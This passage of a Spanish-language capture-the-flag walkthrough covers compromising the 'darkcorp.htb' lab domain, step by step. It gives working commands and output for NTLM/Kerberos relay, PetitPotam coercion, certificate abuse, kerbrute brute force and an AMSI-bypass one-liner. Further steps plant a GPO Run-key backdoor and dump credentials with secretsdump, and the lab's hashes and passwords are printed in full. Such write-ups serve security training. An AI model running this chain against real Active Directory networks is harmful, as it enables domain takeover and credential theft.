[*] Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at WEB-01.darkcorp.htb
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  WEB-01.darkcorp.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  WEB-01.darkcorp.htb:445  ...  OK
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

Viendo esto veremos que funciono, por lo que si vamos a donde tenemos la esscucha del `responder` veremos lo siguiente:

```
...............................<RESTO_DE_CODIGO>...................................
[+] Listening for events...                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.11.54
[SMB] NTLMv2-SSP Username : darkcorp\WEB-01$
[SMB] NTLMv2-SSP Hash     : WEB-01$::darkcorp:4f8fda8a49ec4726:5C7301CFD9E451B0E842543FA9E4B364:0101000000000000807B3EC78545DC019DEE619371E126AF00000000020008005A0043004300580001001E00570049004E002D0035005100390039004100330049005500520045005A0004003400570049004E002D0035005100390039004100330049005500520045005A002E005A004300430058002E004C004F00430041004C00030014005A004300430058002E004C004F00430041004C00050014005A004300430058002E004C004F00430041004C0007000800807B3EC78545DC0106000400020000000800300030000000000000000000000000400000B0DFBCDEEF175ECFABA43D42D61887693E2F7EF3812E688338F3A0620E3522790A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320030000000000000000000
```

Vemos que lo capturamos de forma correcta, pero no se puede `crackear`, despues de investigar un rato vemos que el usuario `SVC_ACC` pertenece al grupo de `DNSADMINS` por lo que podremos crear un `dominio` de `DNS` el que podamos conectarnos a el para obtener unas credenciales de autenticacion.

## Escalate user Administrator local (web-01)

Primero vamos a crear dicho `dominio` de esta forma:

```shell
proxychains impacket-ntlmrelayx -t ldap://172.16.20.1 --add-dns-record dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.220
```

Ahora mientras estamos a la escucha, vamos autenticarnos de esta forma:

```shell
proxychains curl -v 'http://172.16.20.2:5000/status' \
  -H 'Content-Type: application/json' \
  --data-raw '{"protocol":"http","host":"drip.darkcorp.htb","port":8080}' \
  --ntlm -u 'victor.r:victor1gustavo@#'
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 10.10.11.54 controlled, attacking target ldap://172.16.20.1
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:389  ...  OK
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:53  ...  OK
[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.14.220` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

Vemos que se creo de forma correcta, ahora vamos a utilizar dicho `dominio` cerrando el servidor de antes y abriendo este nuevo descargandonos antes el repo de `github` de la herramienta que vamos a utilizar.

```shell
python3 -m venv .venv                                                
source .venv/bin/activate
pip3 install --upgrade cryptography pyopenssl
pip3 install impacket
proxychains krbrelayx -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs --template Machine -v 'WEB-01$' -dc-ip 172.16.20.1
```

Estando a la escucha con ese otro servidor, como dije nos descargamos la herramienta:

```shell
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam/
proxychains python3 PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 172.16.20.2
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/opt/krbrelayx/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.20.2[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Enviando esto si volvemos a donde tenemos la escucha del servidor, veremos lo siguiente:

```
..............................<RESTO_DE_CODIGO>....................................
[*] SMBD: Received connection from 10.10.11.54
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:443  ...  OK
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.10.11.54
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:443  ...  OK
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] Skipping user WEB-01$ since attack was already performed
[*] GOT CERTIFICATE! ID 6
[*] Writing PKCS#12 certificate to ./WEB-01.pfx
[*] Certificate successfully written to file
```

Veremos que ha funcionado y obtendremos un archivo llamado `WEB-01.pfx` el cual vamos a utilizar para obtener un certificado.

### Obtencion de certificado/credenciales Administrador local

Antes tendremos que obtener la hora de la maquina para que no de error, para ello tendremos que ir a la shell por `SSH` y poner `date` eso nos dara esto:

```
Sat Oct 25 04:23:14 AM MDT 2025
```

Con esa info podremos ponerlo manualmente de esta forma:

```shell
date +%T -s "04:23:14"
date +%Y%m%d -s "20251025"
```

Y seguidamente tendremos que ejecutar el comando...

```shell
proxychains certipy-ad auth -pfx WEB-01.pfx -dc-ip 172.16.20.1 -ns 172.16.20.1
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
[*] Using principal: 'web-01$@darkcorp.htb'
[*] Trying to get TGT...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Got TGT
[*] Saving credential cache to 'web-01.ccache'
[*] Wrote credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

Veremos que ha funcionado sin errores, por lo que con este `hash` podremos realizar una solicitud de `TGT` para obtener el `hash` del usuario `administrador` de esta forma:

```shell
proxychains impacket-getST -self 'DARKCORP.HTB/WEB-01$' -altservice 'cifs/web-01.darkcorp.htb' -dc-ip 172.16.20.1 -impersonate 'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675'
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Impersonating administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:88  ...  OK
[*] Changing service from WEB-01$@DARKCORP.HTB to cifs/web-01.darkcorp.htb@DARKCORP.HTB
[*] Saving ticket in administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache
```

Vemos que ha funcionado por lo que vamos a exportar este archivo en la variable de `kerberos` para utilizarlo como autenticacion:

```shell
export KRB5CCNAME=administrator@cifs_web-01.darkcorp.htb@DARKCORP.HTB.ccache
```

Ahora si probamos por `netexec` a obtener las credenciales del usuario `admin`...

```shell
proxychains nxc smb 172.16.20.2 -k --use-kcache --dpapi
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:445  ...  OK
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:445  ...  OK
SMB         172.16.20.2     445    WEB-01           [+] DARKCORP.HTB\administrator from ccache (Pwn3d!)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKCORP.HTB:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC-01.darkcorp.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKCORP.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKCORP.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  WEB-01.DARKCORP.HTB:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  WEB-01.darkcorp.htb:445  ...  OK
SMB         172.16.20.2     445    WEB-01           [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         172.16.20.2     445    WEB-01           [+] Got 5 decrypted masterkeys. Looting secrets...
SMB         172.16.20.2     445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
```

### evil-winrm Administrator (local)

Veremos que ha funcionado, por lo que vamos a conectarnos por `WinRM` de esta forma:

```shell
proxychains evil-winrm -i 172.16.20.2 -u administrator -p 'But_Lying_Aid9!'
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.2:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
web-01\administrator
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
882e77b98a4568d5637096294f60af76
```

## Escalate user taylor.b.adm

Si investigamos un poco veremos que el usuario `TAYLOR.B.ADM` pertenece al grupo llamado `GPO_MANAGER` que este a su vez tiene permisos de `WriteDacl, WriteOwner y GenericWrite` sobre el objeto llamado `SECURITYUPDATES`, por lo que podremos realizar lo siguiente:

```shell
proxychains rpcclient -U 'victor.r%victor1gustavo@#' 172.16.20.1
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
rpcclient $>
```

Ahora si listamos la informacion de la longitud de la contraseña...

```shell
getdompwinfo
```

Info:

```
min_password_length: 7
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
```

Veremos que son de `7` caracteres, sabiendo esto probaremos a realizar fuerza bruta con dicho usuario a ver si hay suerte, para no complicarnos vamos a descargarnos la herramienta de `kerbrute` desde `GitHub` y pasarla a la maquina victima, haremos lo mismo con el `wordlist` de `rockyou.txt`.

URL = [Download kerbrute Linux amd64 binary](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)

Una vez descargado, lo moveremos a nuestro directorio actual el binario, y haremos lo mismo con el `rockyou.txt`:

```shell
cp /usr/share/wordlists/rockyou.txt .
python3 -m http.server 80
```

Abriendo un servidor de `python3` en la maquina victima nos conectaremos por `SSH` con el usuario `ebelford` y nos iremos a `/tmp`.

```shell
cd /tmp
wget http://<IP_ATTACKER>/kerbrute
wget http://<IP_ATTACKER>/rockyou.txt
# Seguidamente ejecutaremos la herramienta de esta forma...
time ./kerbrute bruteuser -d darkcorp.htb --dc 172.16.20.1 rockyou.txt taylor.b.adm
```

Info:

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/25/25 - Ronnie Flathers @ropnop

2025/10/25 05:00:00 >  Using KDC(s):
2025/10/25 05:00:00 >   172.16.20.1:88

2025/10/25 05:20:07 >  [+] VALID LOGIN:  taylor.b.adm@darkcorp.htb:!QAZzaq1
2025/10/25 05:20:07 >  Done! Tested 99381 logins (1 successes) in 1207.728 seconds

real    20m7.736s
user    14m20.697s
sys     1m18.890s
```

Despues de un buen rato (Cosa de unos 20 minutos) veremos que funciono y obtendremos las credenciales del usuario `taylor.b.adm`.

Ahora teniendo este usuario podremos agregar este usuario como `Administrador` explotando las políticas de grupo, pero el antivirus esta activo, por lo que tendremos que `bypassearlo`, para ello utilizaremos una herramienta llamada `PowerGPOAbuse.ps1`.

URL = [Download PowerGPOAbuse.ps1 GitHub](https://github.com/rootSySdk/PowerGPOAbuse)

```shell
wget https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/refs/heads/master/PowerGPOAbuse.ps1
```

Hecho esto tendremos que conectarnos por `WinRM` con las credenciales de dicho usuario.

> NOTA: Seguimos utilizando `proxychains` ya que tenemos la tunelizacion que realizamos anteriormente desde `SSH` con el parametro `-D 1080`.

### evil-winrm taylor.b.adm

```shell
proxychains evil-winrm -u taylor.b.adm -p '!QAZzaq1' -i dc-01.darkcorp.htb
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:5985  ...  OK
*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> whoami
darkcorp\taylor.b.adm
```

## Escalate Privileges

Veremos que ha funcionado, por lo que desde las utilidades de `evil-winrm` vamos a subirnos dicho archivo de esta forma:

```powershell
cd ..\Downloads\
upload PowerGPOAbuse.ps1
```

Info:

```
Info: Uploading /opt/krbrelayx/PetitPotam/PowerGPOAbuse.ps1 to C:\Users\taylor.b.adm\Downloads\PowerGPOAbuse.ps1
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:5985  ...  OK
                                        
Data: 179124 bytes of 179124 bytes copied
                                        
Info: Upload successful!
```

### Bypass Modulo AMSI

Ahora realizaremos un `AMSI Bypass` de esta forma:

```powershell
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*siUtils' }; $b = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*siContext' }; [IntPtr]$c = $b.GetValue($null); [Int32[]]$d = @(0); [System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
```

Con esto en la terminal actual el modulo `AMSI` del `Windows Defender` no va a analizar nada de los comandos que ejecutemos en dicha terminal, por lo que tenemos via libre.

Vamos añadir a dicho usuario a un grupo especifico mediante una politica de grupo en este caso en el grupo llamado `SecurityUpdates`.

```powershell
Import-Module .\PowerGPOAbuse.ps1
Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates'
```

Info:

```
True
```

### Agregar usuario al grupo Administrators

Veremos que ha funcionado viendo ese `True` por lo que vamos agregar una regla en el registro de `Windows` para que cada vez que se inicie el sistema se ejecute dicho comando de `PowerShell`, lo que haremos con este comando sera que meta al usuario `taylor.b.adm` al grupo de `Administradores`.

```powershell
Set-GPRegistryValue -Name "SecurityUpdates" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "backdoor" -Type String -Value "powershell -ExecutionPolicy Bypass -NoProfile -Command `"Add-LocalGroupMember -Group 'Administrators' -Member taylor.b.adm`""
```

Info:

```
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc-01.darkcorp.htb:5985  ...  OK


DisplayName      : SecurityUpdates
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 652cae9a-4bb7-49f2-9e52-3361f33ce786
GpoStatus        : AllSettingsEnabled
Description      : Windows Security Group Policy
CreationTime     : 1/3/2025 3:01:12 PM
ModificationTime : 10/25/2025 4:21:08 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 2, SysVol Version: 2
WmiFilter        :
```

Ahora vamos a forzar una actualizacion inmediata de las politicas de grupo para que se ejecute dicho comando.

```powershell
gpupdate /force
```

Info:

```
Updating policy...



Computer Policy update has completed successfully.



The following warnings were encountered during computer policy processing:



Windows failed to apply the Group Policy Scheduled Tasks settings. Group Policy Scheduled Tasks settings might have its own log file. Please click on the "More information" link.

User Policy update has completed successfully.


For more detailed information, review the event log or run GPRESULT /H GPReport.html from the command line to access information about Group Policy results.
```

### Dump secrets Windows

Ahora desde una terminal del atacante, vamos a dumpearnos los `hashes` de la maquina victima para obtener el que nos interesa del `Administrador` del `dominio`.

```shell
proxychains impacket-secretsdump darkcorp/taylor.b.adm:'!QAZzaq1'@darkcorp.htb
```

Info:

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  darkcorp.htb:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
darkcorp\DC-01$:des-cbc-md5:eca71034201a3826
darkcorp\DC-01$:plain_password_hex:90d17589c9c348f3ea541982f161b1f658cec76e33e32762cba25cf55643a853efd93dd5cffec0cba16e008a2c7112715437d6a33b72e28405c53f68965349b0676128c9cb1997717523971bdaf255f72d9664d3ed5c06f1e5eb3a5b2ef6dc435727ed160e340591724e1230782e2484e25f8484a7b21bf102f71c9a91219cc23743377526a9c73eec8a70def939e673dd244d21be9ec18ba0d915bc080e8bfb3ac8953b5c6e64adb1107b062ddad75ce0e1f805bcdb52de979599787fac9d8246807055b4671191a41804f7918da2b82e3a4fde2959cd227a8af08982a89bcc7437e13426e8ff74273c4e0538a65eeb
darkcorp\DC-01$:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x395bad4405a9fd2285737a8ce7c6d9d60e6fceb3
dpapi_userkey:0x3f426bba655ad645920a84d740836ed1edf35836
[*] NL$KM 
 0000   65 DB D5 E7 F9 08 5C 24  AB 45 B5 E5 5D E5 3F DD   e.....\$.E..].?.
 0010   89 93 2A C7 F3 70 1E 5A  B7 8D 4E D3 BA 3B 5F 0C   ..*..p.Z..N..;_.
 0020   A9 FC 32 69 57 6D E6 78  D0 07 33 43 FE 1E 06 A6   ..2iWm.x..3C....
 0030   1E 56 2C 27 91 47 56 54  91 0D 20 79 E7 7A 2F 95   .V,'.GVT.. y.z/.
NL$KM:65dbd5e7f9085c24ab45b5e55de53fdd89932ac7f3701e5ab78d4ed3ba3b5f0ca9fc3269576de678d0073343fe1e06a61e562c2791475654910d2079e77a2f95
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  darkcorp.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  darkcorp.htb:49670  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:6daec5c8ac7719888d8c7ddb2bb78cc7:::
WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:97064b5e2ed9569a7a61cb6e71fd624e20de8464fc6d3f7f9c9ccd5ec865cd05
Administrator:aes128-cts-hmac-sha1-96:0424167c3041ed3b8df4ab1c996690c1
Administrator:des-cbc-md5:a1b004ad46dc19d9
krbtgt:aes256-cts-hmac-sha1-96:2795479225a152c8958119e8549079f2a59e101d84a3e464603a9cced55580d6
krbtgt:aes128-cts-hmac-sha1-96:183ebcd77ae33f476eb13c3f4404b98d
krbtgt:des-cbc-md5:7fe9e5ad67524001
victor.r:aes256-cts-hmac-sha1-96:84e79cb6b8959ebdda0dc73d2c6728bb9664d0d75c2aef702b0ea0a4126570bb
victor.r:aes128-cts-hmac-sha1-96:bc1fa04172b62be4428af05dcd4941af
victor.r:des-cbc-md5:62491fa740918316
svc_acc:aes256-cts-hmac-sha1-96:21ebfe2a41e5d614795ef004a06135748d5af03d0f2ca7fd6f6d804ac00f759a
svc_acc:aes128-cts-hmac-sha1-96:aebdba02d03943f17f553495f5f5e1d1
svc_acc:des-cbc-md5:5bec0bb54a405ed9
john.w:aes256-cts-hmac-sha1-96:6c0d89a7461f21150bbab0e4c9dea04ca4feb27a4f432c95030dbfa17f4f7de5
john.w:aes128-cts-hmac-sha1-96:16da7304c10a476b10a0ad301f858826
john.w:des-cbc-md5:e90b041f52b30875
angela.w:aes256-cts-hmac-sha1-96:25f7053fcfb74cf4f02dab4b2c7cb1ae506f3c3c09e4a5b7229b9f21a761830a
angela.w:aes128-cts-hmac-sha1-96:15f1467015c7cdd49ef74fd2fe549cf3
angela.w:des-cbc-md5:5b0168dacbc22a5e
angela.w.adm:aes256-cts-hmac-sha1-96:bec3236552b087f396597c10431e9a604be4b22703d37ae45cde6cd99873c693
angela.w.adm:aes128-cts-hmac-sha1-96:994dccb881c6a80c293cac8730fd18a2
angela.w.adm:des-cbc-md5:cb0268169289bfd9
taylor.b:aes256-cts-hmac-sha1-96:b269239174e6de5c93329130e77143d7a560f26938c06dae8b82cae17afb809c
taylor.b:aes128-cts-hmac-sha1-96:a3f7e9307519e6d3cc8e4fba83df0fef
taylor.b:des-cbc-md5:9b8010a21f1c7a3d
taylor.b.adm:aes256-cts-hmac-sha1-96:4c1e6783666861aac09374bee2bc48ba5ad331f3ac87e067c4a330c6a31dd71a
taylor.b.adm:aes128-cts-hmac-sha1-96:85712fd85df4669be88350520651cfe2
taylor.b.adm:des-cbc-md5:ce6176f4f4e5cd9e
darkcorp.htb\eugene.b:aes256-cts-hmac-sha1-96:33e0cf90ad3c5d0cd264207421c506b56b8ca9703b5be8c58a97169851067fd1
darkcorp.htb\eugene.b:aes128-cts-hmac-sha1-96:adf8b2743349be9684f8ec27df53fa92
darkcorp.htb\eugene.b:des-cbc-md5:2f5ef4b06b231afd
darkcorp.htb\bryce.c:aes256-cts-hmac-sha1-96:e835ec6b7d680472bdf65ac11ec17395930b5d778ba08481ef7290616b1fa7a8
darkcorp.htb\bryce.c:aes128-cts-hmac-sha1-96:09b1a46858723452ce11da2335b602b0
darkcorp.htb\bryce.c:des-cbc-md5:26d55b5849b6e623
DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
DC-01$:des-cbc-md5:8038f74f7c0da1b5
DRIP$:aes256-cts-hmac-sha1-96:e38daad4923dd3515228279334f1707059006752edb27270f8df7777ca400bcb
DRIP$:aes128-cts-hmac-sha1-96:f78589aa5707bb7de5fd5c34b5b24225
DRIP$:des-cbc-md5:f80b23fe6867893b
WEB-01$:aes256-cts-hmac-sha1-96:f16448747d7df00ead462e40b26561ba01be87d83068ef0ed766ec8e7dd2a12e
WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
WEB-01$:des-cbc-md5:38e00bb3d901eaef
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

Vemos que ha funcionado y obtendremos el `hash` del `admin` que seria este de aqui.

> Hash Admin NTLM

```
fcb3ca5a19a1ccf2d14c13e8b64cde0f
```

### evil-winrm Admin (Domain)

